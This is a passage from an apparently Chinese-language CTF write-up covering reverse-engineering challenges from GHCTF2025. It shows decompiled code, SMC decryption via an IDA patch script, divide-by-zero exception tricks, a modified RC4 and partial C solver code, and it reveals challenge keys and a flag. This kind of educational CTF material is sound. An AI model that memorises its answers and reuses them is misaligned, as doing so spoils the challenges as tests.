<span class="number">0x92</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0xDC</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xF3</span>, <span class="number">0x1C</span>, <span class="number">0xA0</span>, <span class="number">0xAA</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> okflag[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* f = flag;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* ii = iv;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* ff = okflag;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//de1(f);</span></span><br><span class="line">de2(f);</span><br><span class="line">AES128_CBC_Decrypt(f, <span class="number">16</span>, key, ff, ii);</span><br><span class="line">de3(ff);</span><br><span class="line">f += <span class="number">16</span>;</span><br><span class="line">ii += <span class="number">16</span>;</span><br><span class="line">ff += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(okflag[<span class="number">0</span>]==<span class="string">&#x27;N&#x27;</span>&amp;&amp;okflag[<span class="number">1</span>]==<span class="string">&#x27;S&#x27;</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%d %d:&quot;</span>, month, day);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, okflag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//NSSCTF&#123;W0w_Y0u&#x27;re_@n_AE5_M@5t3r&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Room0"><a href="#Room0" class="headerlink" title="Room0"></a>Room0</h2><p>异常+SMC+rc4变</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+18h] [ebp-234h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+18h] [ebp-234h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+18h] [ebp-234h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+18h] [ebp-234h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+18h] [ebp-234h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-220h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [esp+30h] [ebp-21Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">256</span>]; <span class="comment">// [esp+130h] [ebp-11Ch] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+234h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  sub_4028C0(<span class="string">&quot;Welcome to the hostel!\n&quot;</span>, v4);</span><br><span class="line">  sub_4028C0(<span class="string">&quot;Please input your informatioin to enter your room.\n&quot;</span>, v5);</span><br><span class="line">  sub_4028C0(<span class="string">&quot;Input your flag:&quot;</span>, v6);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  sub_402900(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  sub_4028C0(<span class="string">&quot;Input your Key:&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  sub_402900(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)v10);</span><br><span class="line">  <span class="keyword">if</span> ( sub_402000(v10) != <span class="number">0x11451419</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4028C0(<span class="string">&quot;Not the key.\n&quot;</span>, v8);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_402130(Str, <span class="number">0x19</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] != (<span class="type">unsigned</span> __int8)byte_405000[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4028C0(<span class="string">&quot;Your flag is incorrect.\n&quot;</span>, v8);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4028C0(<span class="string">&quot;Welcome into your room\n&quot;</span>, v8);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入分两个一个key一个input，看汇编码会发现<img src="/.io//tool\blog\source\postpic\ghctf2025\4.png" loading="lazy"></p><p>这里是有异常处理的，并且还是有模有样地，不难猜测会有地方触发异常，肉眼可见的没有，就看看函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402000</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+0h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = sub_402590(Str);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v9 = v2;</span><br><span class="line">  v8 = HIBYTE(v2);</span><br><span class="line">  v5 = BYTE2(v2);</span><br><span class="line">  v4 = BYTE1(v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v6 * (v8 + <span class="number">1415881080</span>) * (v9 - <span class="number">1467486175</span>) * ((v8 - v9) ^ (v8 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">    v5 = (v9 + v5) ^ (<span class="number">8</span> * v4);</span><br><span class="line">    v4 = (v9 + v8) ^ (<span class="number">8</span> * v5);</span><br><span class="line">    v8 = (v9 + v4) ^ (<span class="number">8</span> * v5);</span><br><span class="line">    v9 -= v4 + v5 + v8;</span><br><span class="line">    v6 = v7 + (v8 + <span class="number">1467486175</span>) * (((v8 - v9) ^ (<span class="type">unsigned</span> __int64)(v8 &gt;&gt; <span class="number">4</span>)) / (<span class="type">unsigned</span> <span class="type">int</span>)(v9 - <span class="number">1415881080</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;-div，能够引发除零异常，所以这里必然会引起异常到异常处理模块，这么一看题目名字room 0 原来意思是异常提示，真是旁观者清啊</p><p>那么看异常怎么做了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">mov     ebx, [esp+224h+var_23C]</span><br><span class="line">mov     eax, ebp</span><br><span class="line">sub     eax, 21Ch</span><br><span class="line">push    eax             ; Str</span><br><span class="line">call    sub_402590</span><br><span class="line">push    eax</span><br><span class="line">call    loc_402410</span><br><span class="line">mov     eax, ebp</span><br><span class="line">sub     eax, 11Ch</span><br><span class="line">push    ebx</span><br><span class="line">push    eax</span><br><span class="line">call    sub_401000</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh</span><br></pre></td></tr></table></figure><p>三个函数，第一个之前在验证函数就出现了，是ascii码转16进制，比如你输入的是1a，就会变成0x1a，类似于python代码的int(‘1a’,16)实现了</p><p>第二个函数有花指令去一下</p><p><img src="/.io//tool\blog\source\postpic\ghctf2025\5.png" loading="lazy">这里是永真不爆红花，需要把retn去掉</p><p><img src="/.io//tool\blog\source\postpic\ghctf2025\6.png" loading="lazy">后面是永真跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_402410</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v2; <span class="comment">// [esp+10h] [ebp-30h]</span></span><br><span class="line">    <span class="type">char</span> *v3; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [esp+20h] [ebp-20h]</span></span><br><span class="line">    __int16 v5; <span class="comment">// [esp+24h] [ebp-1Ch]</span></span><br><span class="line">    HMODULE ModuleHandleW; <span class="comment">// [esp+28h] [ebp-18h]</span></span><br><span class="line">    <span class="type">char</span> *Str1; <span class="comment">// [esp+2Ch] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+30h] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> k; <span class="comment">// [esp+34h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// [esp+38h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">        *((_BYTE *)&amp;v10 + i) = a1 &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i));</span><br><span class="line">    v5 = *(_WORD *)((<span class="type">char</span> *)ModuleHandleW + *((_DWORD *)ModuleHandleW + <span class="number">15</span>) + <span class="number">6</span>);</span><br><span class="line">    result = (<span class="type">int</span>)ModuleHandleW + *((_DWORD *)ModuleHandleW + <span class="number">15</span>) + <span class="number">248</span>;</span><br><span class="line">    Str1 = (<span class="type">char</span> *)result;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, <span class="string">&quot;.enc&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v2 = *((_DWORD *)Str1 + <span class="number">4</span>);</span><br><span class="line">            v3 = (<span class="type">char</span> *)ModuleHandleW + *((_DWORD *)Str1 + <span class="number">3</span>);</span><br><span class="line">            <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">            &#123;</span><br><span class="line">                result = k;</span><br><span class="line">                <span class="keyword">if</span> ( k &gt;= v2 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                v3[k] ^= *((_BYTE *)&amp;v10 + k % <span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        result = (<span class="type">int</span>)(Str1 + <span class="number">40</span>);</span><br><span class="line">        Str1 += <span class="number">40</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测当前块是不是enc，如果是的话就进行SMC，解密而SMC异或的对象就是前面输入的key，那么问题来了，key应该是多少呢，这里我动调发现SMC解密的对象就是下一个要调用的函数，再因为一般函数的开头都是55 8B EC 第四个有多种可能，我后来尝试发现对应异或应该是d3，并且</p><p><img src="/.io//tool\blog\source\postpic\ghctf2025\7.png" loading="lazy">我们能发现，这个函数后续都是75 5f f0 d3并且我计算出key的前几位也是75 5f f0，这也验证了第四位是d3的思路，这样这里SMC解密后就是0了，所以key就是755ff0d3</p><p>idc脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start=<span class="number">0x00401000</span></span><br><span class="line">key=[<span class="number">0x75</span>, <span class="number">0x5F</span>, <span class="number">0xF0</span>, <span class="number">0xD3</span>]</span><br><span class="line">end=<span class="number">0x00401600</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(end-start):</span><br><span class="line">    patch_byte(start+i,get_wide_byte(start+i)^key[i%<span class="number">4</span>])</span><br></pre></td></tr></table></figure><p>这里如果是动调看的话有两种花各两个，一种是爆红的永真跳，另一种是不爆红的花，但是如果是脚本静态的看好像就不报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401000</span><span class="params">(<span class="type">char</span> *Str, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int8 v2; <span class="comment">// al</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp-10h] [ebp-244h]</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// [esp+0h] [ebp-234h]</span></span><br><span class="line">    <span class="type">char</span> v6; <span class="comment">// [esp+4h] [ebp-230h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [esp+8h] [ebp-22Ch]</span></span><br><span class="line">    <span class="type">int</span> ii; <span class="comment">// [esp+Ch] [ebp-228h]</span></span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// [esp+10h] [ebp-224h]</span></span><br><span class="line">    <span class="type">int</span> k; <span class="comment">// [esp+14h] [ebp-220h]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [esp+18h] [ebp-21Ch]</span></span><br><span class="line">    <span class="type">int</span> m; <span class="comment">// [esp+1Ch] [ebp-218h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+20h] [ebp-214h]</span></span><br><span class="line">    <span class="type">char</span> v14; <span class="comment">// [esp+24h] [ebp-210h]</span></span><br><span class="line">    <span class="type">char</span> v15; <span class="comment">// [esp+25h] [ebp-20Fh]</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v16; <span class="comment">// [esp+26h] [ebp-20Eh]</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v17; <span class="comment">// [esp+27h] [ebp-20Dh]</span></span><br><span class="line">    <span class="type">char</span> v18[<span class="number">256</span>]; <span class="comment">// [esp+28h] [ebp-20Ch] BYREF</span></span><br><span class="line">    <span class="type">char</span> v19[<span class="number">256</span>]; <span class="comment">// [esp+128h] [ebp-10Ch] BYREF</span></span><br><span class="line">    <span class="type">int</span> v20[<span class="number">2</span>]; <span class="comment">// [esp+228h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v20[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v20[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v2 = (<span class="type">unsigned</span> __int8)<span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="keyword">sizeof</span>(v19));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt;= <span class="number">4</span> )</span><br><span class="line">            v6 = <span class="number">7</span> - i;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v6 = i;</span><br><span class="line">        v2 = i;</span><br><span class="line">        *((_BYTE *)v20 + i) = a2 &gt;&gt; (<span class="number">8</span> * v6);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = j;</span><br><span class="line">        v19[j] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = v2;</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">        v18[k] = *((_BYTE *)v20 + k % <span class="number">8</span>);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">256</span>; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = ((<span class="type">unsigned</span> __int8)v18[m] + v7 + (<span class="type">unsigned</span> __int8)v19[m]) % <span class="number">256</span>;</span><br><span class="line">        v15 = v19[m];</span><br><span class="line">        v19[m] = v19[v7];</span><br><span class="line">        v19[v7] = v15;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; v5; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">        v16 += v19[++v17];</span><br><span class="line">        v14 = v19[v17];</span><br><span class="line">        v19[v17] = v19[v16];</span><br><span class="line">        v19[v16] = v14;</span><br><span class="line">        Str[n] ^= *((_BYTE *)v20 + (v17 &amp; <span class="number">7</span>)) ^ v19[((<span class="type">unsigned</span> __int8)v19[v16] + (<span class="type">unsigned</span> __int8)v19[v17]) % <span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">32</span>; ++ii )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( byte_405020[ii] != Str[ii] )</span><br><span class="line">        &#123;</span><br><span class="line">            sub_4028C0(<span class="string">&quot;You shouldn&#x27;t come here, get out of that room!\n&quot;</span>, v4);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来时rc4，但是再rc4最后一步异或的时候多异或了一个key，逻辑就是把a2 01233210的方式加倍生成8位key，然后rc4，所以现在只需要知道key就可以解密了，动调看把</p><p>后面我测试了一下，如果除零异常时手动将div ecx里面的ecx改成了0，则最终ebx，也就是a2传参就是0，但如果是正常的输入正确key然后运行过程中爆除零异常，那么ebx就会是正确的key</p><p><img src="/.io//tool\blog\source\postpic\ghctf2025\8.png" loading="lazy"><img src="/.io//tool\blog\source\postpic\ghctf2025\9.png" loading="lazy"></p><p>可以看到如果是正常输入的话，i&#x3D;&#x3D;0xf的时候会变成0，这时候<img src="/.io//tool\blog\source\postpic\ghctf2025\11.png" loading="lazy"></p><p>ebx会是正确key，大概能猜到，这里的ebx就是之前那些计算留下来的数</p><p>解题脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> keybox[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//标准RC4</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> keyk[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">int</span> key_Len, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> data_Len)</span> <span class="comment">//加解密</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span>  <span class="type">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ps = s;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + s[i] + keybox[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> q = <span class="number">0</span>;</span><br><span class="line">    i = j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (q = <span class="number">0</span>;q &lt; data_Len;q++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        data[q] ^= s[t]^ keyk[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> 